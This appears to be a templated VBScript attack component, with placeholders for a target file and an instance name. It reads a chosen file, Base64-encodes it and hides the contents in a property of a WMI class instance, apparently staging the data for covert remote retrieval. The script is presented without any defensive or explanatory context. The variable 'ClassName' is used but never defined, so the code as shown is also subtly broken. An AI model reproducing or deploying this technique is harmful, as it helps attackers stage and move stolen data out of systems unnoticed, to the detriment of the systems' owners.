Dim inputFile
inputFile = Base64StringDecode("REPLACE_WITH_TARGET_FILE")

LoadDataIntoClass Base64EncodeFile(inputFile)

' Decode filename
Function Base64StringDecode(ByVal vCode)
    Set oXML = CreateObject("Msxml2.DOMDocument")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode

    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write oNode.nodeTypedValue
    objStream.Position = 0
    objStream.Type = 2
    ' All Format =>  utf-16le - utf-8 - utf-16le
    objStream.CharSet = "utf-8"
    Base64StringDecode = objStream.ReadText
    
    ' Cleanup
    Set oNode = Nothing
    Set oXML = Nothing
    Set objStream = Nothing
End Function

Function Base64EncodeFile(inputFile)
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 'Binary
    objStream.Open
    objStream.LoadFromFile inputFile
    data = objStream.Read
    objStream.Close

    ' Convert to Base64
    Set oXML = CreateObject("Msxml2.DOMDocument")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue = data
    Base64EncodeFile = oNode.text
    
    ' Cleanup
    Set oNode = Nothing
    Set oXML = Nothing
    Set objStream = Nothing
End Function

Function LoadDataIntoClass(data)
    instanceName = "RELEACE_WITH_UUID"
    
    On Error Resume Next
    Set objTestNewInst = GetObject("Winmgmts:root\cimv2:" & ClassName & ".CreationClassName=""" & instanceName & """")
    If Err.Number <> 0 Then
        Err.Clear
        wbemCimtypeString = 8
        Set objClass = GetObject("Winmgmts:root\cimv2:" & ClassName)
        Set objInstance = objClass.spawninstance_
        objInstance.CreationClassName = instanceName
        objInstance.DebugOptions = data
        objInstance.put_
    Else
    End If
End Function